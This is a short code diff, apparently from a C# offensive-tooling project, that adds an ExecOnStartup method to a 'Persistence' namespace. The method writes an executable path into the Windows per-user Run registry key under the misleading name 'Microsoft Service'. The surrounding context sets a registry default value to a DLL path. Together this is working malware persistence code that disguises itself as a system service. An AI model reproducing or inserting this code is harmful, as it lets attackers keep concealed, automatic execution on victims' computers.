@@ -86,5 +86,13 @@ namespace Persistence
             // Set Default Value
             subKey.SetValue("", pathToDll, RegistryValueKind.String);
         }
+
+        public void ExecOnStartup(string pathToExe)
+        {
+            registryKey = Registry.CurrentUser;
+            var subKey = registryKey.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
+            ArgumentNullException.ThrowIfNull(subKey);
+            subKey.SetValue("Microsoft Service", @$"{pathToExe}", RegistryValueKind.String);
+        }
     }
 }
